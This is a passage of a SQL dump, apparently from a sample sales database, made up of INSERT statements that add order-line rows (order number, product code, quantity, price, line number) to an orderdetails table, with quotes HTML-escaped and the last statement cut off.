INSERT INTO `orderdetails` VALUES (\u0026#39;10260\u0026#39;, \u0026#39;S32_3207\u0026#39;, \u0026#39;27\u0026#39;, \u0026#39;55.30\u0026#39;, \u0026#39;9\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10260\u0026#39;, \u0026#39;S50_1514\u0026#39;, \u0026#39;21\u0026#39;, \u0026#39;56.24\u0026#39;, \u0026#39;7\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10260\u0026#39;, \u0026#39;S700_1938\u0026#39;, \u0026#39;33\u0026#39;, \u0026#39;80.55\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10261\u0026#39;, \u0026#39;S10_4757\u0026#39;, \u0026#39;27\u0026#39;, \u0026#39;116.96\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10261\u0026#39;, \u0026#39;S18_4522\u0026#39;, \u0026#39;20\u0026#39;, \u0026#39;80.75\u0026#39;, \u0026#39;9\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10261\u0026#39;, \u0026#39;S24_2011\u0026#39;, \u0026#39;36\u0026#39;, \u0026#39;105.69\u0026#39;, \u0026#39;8\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10261\u0026#39;, \u0026#39;S24_3151\u0026#39;, \u0026#39;22\u0026#39;, \u0026#39;79.66\u0026#39;, \u0026#39;3\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10261\u0026#39;, \u0026#39;S700_1138\u0026#39;, \u0026#39;34\u0026#39;, \u0026#39;64.00\u0026#39;, \u0026#39;4\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10261\u0026#39;, \u0026#39;S700_2610\u0026#39;, \u0026#39;44\u0026#39;, \u0026#39;58.55\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10261\u0026#39;, \u0026#39;S700_3505\u0026#39;, \u0026#39;25\u0026#39;, \u0026#39;89.15\u0026#39;, \u0026#39;5\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10261\u0026#39;, \u0026#39;S700_3962\u0026#39;, \u0026#39;50\u0026#39;, \u0026#39;88.39\u0026#39;, \u0026#39;6\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10261\u0026#39;, \u0026#39;S72_3212\u0026#39;, \u0026#39;29\u0026#39;, \u0026#39;43.68\u0026#39;, \u0026#39;7\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10262\u0026#39;, \u0026#39;S18_1662\u0026#39;, \u0026#39;49\u0026#39;, \u0026#39;157.69\u0026#39;, \u0026#39;9\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10262\u0026#39;, \u0026#39;S18_3029\u0026#39;, \u0026#39;32\u0026#39;, \u0026#39;81.72\u0026#39;, \u0026#39;15\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10262\u0026#39;, \u0026#39;S18_3856\u0026#39;, \u0026#39;34\u0026#39;, \u0026#39;85.75\u0026#39;, \u0026#39;14\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10262\u0026#39;, \u0026#39;S24_1785\u0026#39;, \u0026#39;34\u0026#39;, \u0026#39;98.48\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10262\u0026#39;, \u0026#39;S24_2841\u0026#39;, \u0026#39;24\u0026#39;, \u0026#39;63.71\u0026#39;, \u0026#39;10\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10262\u0026#39;, \u0026#39;S24_3420\u0026#39;, \u0026#39;46\u0026#39;, \u0026#39;65.75\u0026#39;, \u0026#39;11\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10262\u0026#39;, \u0026#39;S24_3816\u0026#39;, \u0026#39;49\u0026#39;, \u0026#39;82.18\u0026#39;, \u0026#39;16\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10262\u0026#39;, \u0026#39;S24_3949\u0026#39;, \u0026#39;48\u0026#39;, \u0026#39;58.69\u0026#39;, \u0026#39;8\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10262\u0026#39;, \u0026#39;S32_4289\u0026#39;, \u0026#39;40\u0026#39;, \u0026#39;63.97\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10262\u0026#39;, \u0026#39;S50_1341\u0026#39;, \u0026#39;49\u0026#39;, \u0026#39;35.78\u0026#39;, \u0026#39;3\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10262\u0026#39;, \u0026#39;S700_1691\u0026#39;, \u0026#39;40\u0026#39;, \u0026#39;87.69\u0026#39;, \u0026#39;4\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10262\u0026#39;, \u0026#39;S700_2047\u0026#39;, \u0026#39;44\u0026#39;, \u0026#39;83.28\u0026#39;, \u0026#39;13\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10262\u0026#39;, \u0026#39;S700_2466\u0026#39;, \u0026#39;33\u0026#39;, \u0026#39;81.77\u0026#39;, \u0026#39;6\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10262\u0026#39;, \u0026#39;S700_3167\u0026#39;, \u0026#39;27\u0026#39;, \u0026#39;64.80\u0026#39;, \u0026#39;5\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10262\u0026#39;, \u0026#39;S700_4002\u0026#39;, \u0026#39;35\u0026#39;, \u0026#39;64.41\u0026#39;, \u0026#39;7\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10262\u0026#39;, \u0026#39;S72_1253\u0026#39;, \u0026#39;21\u0026#39;, \u0026#39;41.71\u0026#39;, \u0026#39;12\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10263\u0026#39;, \u0026#39;S10_1678\u0026#39;, \u0026#39;34\u0026#39;, \u0026#39;89.00\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10263\u0026#39;, \u0026#39;S10_2016\u0026#39;, \u0026#39;40\u0026#39;, \u0026#39;107.05\u0026#39;, \u0026#39;5\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10263\u0026#39;, \u0026#39;S10_4698\u0026#39;, \u0026#39;41\u0026#39;, \u0026#39;193.66\u0026#39;, \u0026#39;4\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10263\u0026#39;, \u0026#39;S12_2823\u0026#39;, \u0026#39;48\u0026#39;, \u0026#39;123.51\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10263\u0026#39;, \u0026#39;S18_2581\u0026#39;, \u0026#39;33\u0026#39;, \u0026#39;67.58\u0026#39;, \u0026#39;10\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10263\u0026#39;, \u0026#39;S18_2625\u0026#39;, \u0026#39;34\u0026#39;, \u0026#39;50.27\u0026#39;, \u0026#39;6\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10263\u0026#39;, \u0026#39;S24_1578\u0026#39;, \u0026#39;42\u0026#39;, \u0026#39;109.32\u0026#39;, \u0026#39;3\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10263\u0026#39;, \u0026#39;S24_2000\u0026#39;, \u0026#39;37\u0026#39;, \u0026#39;67.03\u0026#39;, \u0026#39;7\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10263\u0026#39;, \u0026#39;S24_4278\u0026#39;, \u0026#39;24\u0026#39;, \u0026#39;59.41\u0026#39;, \u0026#39;11\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10263\u0026#39;, \u0026#39;S32_1374\u0026#39;, \u0026#39;31\u0026#39;, \u0026#39;93.90\u0026#39;, \u0026#39;8\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10263\u0026#39;, \u0026#39;S700_2834\u0026#39;, \u0026#39;47\u0026#39;, \u0026#39;117.46\u0026#39;, \u0026#39;9\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10264\u0026#39;, \u0026#39;S18_3782\u0026#39;, \u0026#39;48\u0026#39;, \u0026#39;58.44\u0026#39;, \u0026#39;3\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10264\u0026#39;, \u0026#39;S18_4721\u0026#39;, \u0026#39;20\u0026#39;, \u0026#39;124.99\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10264\u0026#39;, \u0026#39;S24_2360\u0026#39;, \u0026#39;37\u0026#39;, \u0026#39;61.64\u0026#39;, \u0026#39;6\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10264\u0026#39;, \u0026#39;S24_4620\u0026#39;, \u0026#39;47\u0026#39;, \u0026#39;75.18\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10264\u0026#39;, \u0026#39;S32_2206\u0026#39;, \u0026#39;20\u0026#39;, \u0026#39;39.02\u0026#39;, \u0026#39;4\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10264\u0026#39;, \u0026#39;S32_4485\u0026#39;, \u0026#39;34\u0026#39;, \u0026#39;100.01\u0026#39;, \u0026#39;7\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10264\u0026#39;, \u0026#39;S50_4713\u0026#39;, \u0026#39;47\u0026#39;, \u0026#39;67.53\u0026#39;, \u0026#39;5\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10265\u0026#39;, \u0026#39;S18_3278\u0026#39;, \u0026#39;45\u0026#39;, \u0026#39;74.78\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10265\u0026#39;, \u0026#39;S18_3482\u0026#39;, \u0026#39;49\u0026#39;, \u0026#39;123.47\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10266\u0026#39;, \u0026#39;S12_1099\u0026#39;, \u0026#39;44\u0026#39;, \u0026#39;188.73\u0026#39;, \u0026#39;14\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10266\u0026#39;, \u0026#39;S12_3380\u0026#39;, \u0026#39;22\u0026#39;, \u0026#39;110.39\u0026#39;, \u0026#39;12\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10266\u0026#39;, \u0026#39;S12_3990\u0026#39;, \u0026#39;35\u0026#39;, \u0026#39;67.83\u0026#39;, \u0026#39;15\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10266\u0026#39;, \u0026#39;S12_4675\u0026#39;, \u0026#39;40\u0026#39;, \u0026#39;112.86\u0026#39;, \u0026#39;11\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10266\u0026#39;, \u0026#39;S18_1129\u0026#39;, \u0026#39;21\u0026#39;, \u0026#39;131.63\u0026#39;, \u0026#39;6\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10266\u0026#39;, \u0026#39;S18_1589\u0026#39;, \u0026#39;36\u0026#39;, \u0026#39;99.55\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10266\u0026#39;, \u0026#39;S18_1889\u0026#39;, \u0026#39;33\u0026#39;, \u0026#39;77.00\u0026#39;, \u0026#39;10\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10266\u0026#39;, \u0026#39;S18_1984\u0026#39;, \u0026#39;49\u0026#39;, \u0026#39;139.41\u0026#39;, \u0026#39;5\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10266\u0026#39;, \u0026#39;S18_2870\u0026#39;, \u0026#39;20\u0026#39;, \u0026#39;113.52\u0026#39;, \u0026#39;3\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10266\u0026#39;, \u0026#39;S18_3232\u0026#39;, \u0026#39;29\u0026#39;, \u0026#39;137.17\u0026#39;, \u0026#39;7\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10266\u0026#39;, \u0026#39;S18_3685\u0026#39;, \u0026#39;33\u0026#39;, \u0026#39;127.15\u0026#39;, \u0026#39;4\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10266\u0026#39;, \u0026#39;S24_1628\u0026#39;, \u0026#39;28\u0026#39;, \u0026#39;40.25\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10266\u0026#39;, \u0026#39;S24_2972\u0026#39;, \u0026#39;34\u0026#39;, \u0026#39;35.12\u0026#39;, \u0026#39;8\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10266\u0026#39;, \u0026#39;S24_3371\u0026#39;, \u0026#39;47\u0026#39;, \u0026#39;56.33\u0026#39;, \u0026#39;13\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10266\u0026#39;, \u0026#39;S24_3856\u0026#39;, \u0026#39;24\u0026#39;, \u0026#39;119.37\u0026#39;, \u0026#39;9\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10267\u0026#39;, \u0026#39;S18_4933\u0026#39;, \u0026#39;36\u0026#39;, \u0026#39;71.27\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10267\u0026#39;, \u0026#39;S24_1046\u0026#39;, \u0026#39;40\u0026#39;, \u0026#39;72.02\u0026#39;, \u0026#39;5\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10267\u0026#39;, \u0026#39;S24_2766\u0026#39;, \u0026#39;38\u0026#39;, \u0026#39;76.33\u0026#39;, \u0026#39;3\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10267\u0026#39;, \u0026#39;S24_2887\u0026#39;, \u0026#39;43\u0026#39;, \u0026#39;93.95\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10267\u0026#39;, \u0026#39;S24_3191\u0026#39;, \u0026#39;44\u0026#39;, \u0026#39;83.90\u0026#39;, \u0026#39;4\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10267\u0026#39;, \u0026#39;S24_3432\u0026#39;, \u0026#39;43\u0026#39;, \u0026#39;98.51\u0026#39;, \u0026#39;6\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10268\u0026#39;, \u0026#39;S18_1342\u0026#39;, \u0026#39;49\u0026#39;, \u0026#39;93.49\u0026#39;, \u0026#39;3\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10268\u0026#39;, \u0026#39;S18_1367\u0026#39;, \u0026#39;26\u0026#39;, \u0026#39;45.82\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10268\u0026#39;, \u0026#39;S18_1749\u0026#39;, \u0026#39;34\u0026#39;, \u0026#39;164.90\u0026#39;, \u0026#39;10\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10268\u0026#39;, \u0026#39;S18_2248\u0026#39;, \u0026#39;31\u0026#39;, \u0026#39;60.54\u0026#39;, \u0026#39;9\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10268\u0026#39;, \u0026#39;S18_2325\u0026#39;, \u0026#39;50\u0026#39;, \u0026#39;124.59\u0026#39;, \u0026#39;7\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10268\u0026#39;, \u0026#39;S18_2795\u0026#39;, \u0026#39;35\u0026#39;, \u0026#39;148.50\u0026#39;, \u0026#39;4\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10268\u0026#39;, \u0026#39;S18_3320\u0026#39;, \u0026#39;39\u0026#39;, \u0026#39;96.23\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10268\u0026#39;, \u0026#39;S18_4409\u0026#39;, \u0026#39;35\u0026#39;, \u0026#39;84.67\u0026#39;, \u0026#39;11\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10268\u0026#39;, \u0026#39;S24_1937\u0026#39;, \u0026#39;33\u0026#39;, \u0026#39;31.86\u0026#39;, \u0026#39;6\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10268\u0026#39;, \u0026#39;S24_2022\u0026#39;, \u0026#39;40\u0026#39;, \u0026#39;36.29\u0026#39;, \u0026#39;5\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10268\u0026#39;, \u0026#39;S24_3969\u0026#39;, \u0026#39;30\u0026#39;, \u0026#39;37.75\u0026#39;, \u0026#39;8\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10269\u0026#39;, \u0026#39;S18_2957\u0026#39;, \u0026#39;32\u0026#39;, \u0026#39;57.46\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10269\u0026#39;, \u0026#39;S24_4258\u0026#39;, \u0026#39;48\u0026#39;, \u0026#39;95.44\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10270\u0026#39;, \u0026#39;S10_1949\u0026#39;, \u0026#39;21\u0026#39;, \u0026#39;171.44\u0026#39;, \u0026#39;9\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10270\u0026#39;, \u0026#39;S10_4962\u0026#39;, \u0026#39;32\u0026#39;, \u0026#39;124.10\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10270\u0026#39;, \u0026#39;S12_1666\u0026#39;, \u0026#39;28\u0026#39;, \u0026#39;135.30\u0026#39;, \u0026#39;6\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10270\u0026#39;, \u0026#39;S18_1097\u0026#39;, \u0026#39;43\u0026#39;, \u0026#39;94.50\u0026#39;, \u0026#39;8\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10270\u0026#39;, \u0026#39;S18_2949\u0026#39;, \u0026#39;31\u0026#39;, \u0026#39;81.05\u0026#39;, \u0026#39;10\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10270\u0026#39;, \u0026#39;S18_3136\u0026#39;, \u0026#39;38\u0026#39;, \u0026#39;85.87\u0026#39;, \u0026#39;11\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10270\u0026#39;, \u0026#39;S18_4600\u0026#39;, \u0026#39;38\u0026#39;, \u0026#39;107.76\u0026#39;, \u0026#39;3\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10270\u0026#39;, \u0026#39;S18_4668\u0026#39;, \u0026#39;44\u0026#39;, \u0026#39;40.25\u0026#39;, \u0026#39;7\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10270\u0026#39;, \u0026#39;S32_1268\u0026#39;, \u0026#39;32\u0026#39;, \u0026#39;93.42\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10270\u0026#39;, \u0026#39;S32_3522\u0026#39;, \u0026#39;21\u0026#39;, \u0026#39;52.36\u0026#39;, \u0026#39;5\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10270\u0026#39;, \u0026#39;S700_2824\u0026#39;, \u0026#39;46\u0026#39;, \u0026#39;101.15\u0026#39;, \u0026#39;4\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10271\u0026#39;, \u0026#39;S12_4473\u0026#39;, \u0026#39;31\u0026#39;, \u0026#39;99.54\u0026#39;, \u0026#39;5\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10271\u0026#39;, \u0026#39;S18_2238\u0026#39;, \u0026#39;50\u0026#39;, \u0026#39;147.36\u0026#39;, \u0026#39;4\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10271\u0026#39;, \u0026#39;S18_2319\u0026#39;, \u0026#39;50\u0026#39;, \u0026#39;121.50\u0026#39;, \u0026#39;8\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10271\u0026#39;, \u0026#39;S18_2432\u0026#39;, \u0026#39;25\u0026#39;, \u0026#39;59.55\u0026#39;, \u0026#39;11\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10271\u0026#39;, \u0026#39;S18_3232\u0026#39;, \u0026#39;20\u0026#39;, \u0026#39;169.34\u0026#39;, \u0026#39;9\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10271\u0026#39;, \u0026#39;S24_1444\u0026#39;, \u0026#39;45\u0026#39;, \u0026#39;49.71\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10271\u0026#39;, \u0026#39;S24_2300\u0026#39;, \u0026#39;43\u0026#39;, \u0026#39;122.68\u0026#39;, \u0026#39;10\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10271\u0026#39;, \u0026#39;S24_2840\u0026#39;, \u0026#39;38\u0026#39;, \u0026#39;28.64\u0026#39;, \u0026#39;6\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10271\u0026#39;, \u0026#39;S24_4048\u0026#39;, \u0026#39;22\u0026#39;, \u0026#39;110.00\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10271\u0026#39;, \u0026#39;S32_2509\u0026#39;, \u0026#39;35\u0026#39;, \u0026#39;51.95\u0026#39;, \u0026#39;7\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10271\u0026#39;, \u0026#39;S50_1392\u0026#39;, \u0026#39;34\u0026#39;, \u0026#39;93.76\u0026#39;, \u0026#39;3\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10272\u0026#39;, \u0026#39;S12_1108\u0026#39;, \u0026#39;35\u0026#39;, \u0026#39;187.02\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10272\u0026#39;, \u0026#39;S12_3148\u0026#39;, \u0026#39;27\u0026#39;, \u0026#39;123.89\u0026#39;, \u0026#39;3\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10272\u0026#39;, \u0026#39;S12_3891\u0026#39;, \u0026#39;39\u0026#39;, \u0026#39;148.80\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10272\u0026#39;, \u0026#39;S18_4027\u0026#39;, \u0026#39;25\u0026#39;, \u0026#39;126.39\u0026#39;, \u0026#39;5\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10272\u0026#39;, \u0026#39;S32_3207\u0026#39;, \u0026#39;45\u0026#39;, \u0026#39;56.55\u0026#39;, \u0026#39;6\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10272\u0026#39;, \u0026#39;S50_1514\u0026#39;, \u0026#39;43\u0026#39;, \u0026#39;53.89\u0026#39;, \u0026#39;4\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10273\u0026#39;, \u0026#39;S10_4757\u0026#39;, \u0026#39;30\u0026#39;, \u0026#39;136.00\u0026#39;, \u0026#39;4\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10273\u0026#39;, \u0026#39;S18_3029\u0026#39;, \u0026#39;34\u0026#39;, \u0026#39;84.30\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10273\u0026#39;, \u0026#39;S18_3140\u0026#39;, \u0026#39;40\u0026#39;, \u0026#39;117.47\u0026#39;, \u0026#39;13\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10273\u0026#39;, \u0026#39;S18_3259\u0026#39;, \u0026#39;47\u0026#39;, \u0026#39;87.73\u0026#39;, \u0026#39;15\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10273\u0026#39;, \u0026#39;S18_3856\u0026#39;, \u0026#39;50\u0026#39;, \u0026#39;105.87\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10273\u0026#39;, \u0026#39;S18_4522\u0026#39;, \u0026#39;33\u0026#39;, \u0026#39;72.85\u0026#39;, \u0026#39;12\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10273\u0026#39;, \u0026#39;S24_2011\u0026#39;, \u0026#39;22\u0026#39;, \u0026#39;103.23\u0026#39;, \u0026#39;11\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10273\u0026#39;, \u0026#39;S24_3151\u0026#39;, \u0026#39;27\u0026#39;, \u0026#39;84.08\u0026#39;, \u0026#39;6\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10273\u0026#39;, \u0026#39;S24_3816\u0026#39;, \u0026#39;48\u0026#39;, \u0026#39;83.86\u0026#39;, \u0026#39;3\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10273\u0026#39;, \u0026#39;S700_1138\u0026#39;, \u0026#39;21\u0026#39;, \u0026#39;66.00\u0026#39;, \u0026#39;7\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10273\u0026#39;, \u0026#39;S700_1938\u0026#39;, \u0026#39;21\u0026#39;, \u0026#39;77.95\u0026#39;, \u0026#39;14\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10273\u0026#39;, \u0026#39;S700_2610\u0026#39;, \u0026#39;42\u0026#39;, \u0026#39;57.82\u0026#39;, \u0026#39;5\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10273\u0026#39;, \u0026#39;S700_3505\u0026#39;, \u0026#39;40\u0026#39;, \u0026#39;91.15\u0026#39;, \u0026#39;8\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10273\u0026#39;, \u0026#39;S700_3962\u0026#39;, \u0026#39;26\u0026#39;, \u0026#39;89.38\u0026#39;, \u0026#39;9\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10273\u0026#39;, \u0026#39;S72_3212\u0026#39;, \u0026#39;37\u0026#39;, \u0026#39;51.32\u0026#39;, \u0026#39;10\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10274\u0026#39;, \u0026#39;S18_1662\u0026#39;, \u0026#39;41\u0026#39;, \u0026#39;129.31\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10274\u0026#39;, \u0026#39;S24_2841\u0026#39;, \u0026#39;40\u0026#39;, \u0026#39;56.86\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10274\u0026#39;, \u0026#39;S24_3420\u0026#39;, \u0026#39;24\u0026#39;, \u0026#39;65.09\u0026#39;, \u0026#39;3\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10274\u0026#39;, \u0026#39;S700_2047\u0026#39;, \u0026#39;24\u0026#39;, \u0026#39;75.13\u0026#39;, \u0026#39;5\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10274\u0026#39;, \u0026#39;S72_1253\u0026#39;, \u0026#39;32\u0026#39;, \u0026#39;49.66\u0026#39;, \u0026#39;4\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10275\u0026#39;, \u0026#39;S10_1678\u0026#39;, \u0026#39;45\u0026#39;, \u0026#39;81.35\u0026#39;, \u0026#39;1\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10275\u0026#39;, \u0026#39;S10_2016\u0026#39;, \u0026#39;22\u0026#39;, \u0026#39;115.37\u0026#39;, \u0026#39;4\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10275\u0026#39;, \u0026#39;S10_4698\u0026#39;, \u0026#39;36\u0026#39;, \u0026#39;154.93\u0026#39;, \u0026#39;3\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10275\u0026#39;, \u0026#39;S18_2581\u0026#39;, \u0026#39;35\u0026#39;, \u0026#39;70.12\u0026#39;, \u0026#39;9\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10275\u0026#39;, \u0026#39;S18_2625\u0026#39;, \u0026#39;37\u0026#39;, \u0026#39;52.09\u0026#39;, \u0026#39;5\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10275\u0026#39;, \u0026#39;S24_1578\u0026#39;, \u0026#39;21\u0026#39;, \u0026#39;105.94\u0026#39;, \u0026#39;2\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10275\u0026#39;, \u0026#39;S24_1785\u0026#39;, \u0026#39;25\u0026#39;, \u0026#39;97.38\u0026#39;, \u0026#39;11\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10275\u0026#39;, \u0026#39;S24_2000\u0026#39;, \u0026#39;30\u0026#39;, \u0026#39;61.70\u0026#39;, \u0026#39;6\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10275\u0026#39;, \u0026#39;S24_3949\u0026#39;, \u0026#39;41\u0026#39;, \u0026#39;58.00\u0026#39;, \u0026#39;18\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10275\u0026#39;, \u0026#39;S24_4278\u0026#39;, \u0026#39;27\u0026#39;, \u0026#39;67.38\u0026#39;, \u0026#39;10\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10275\u0026#39;, \u0026#39;S32_1374\u0026#39;, \u0026#39;23\u0026#39;, \u0026#39;89.90\u0026#39;, \u0026#39;7\u0026#39;); INSERT INTO `orderdetails` VALUES (\u0026#39;10275\u0026#39;, 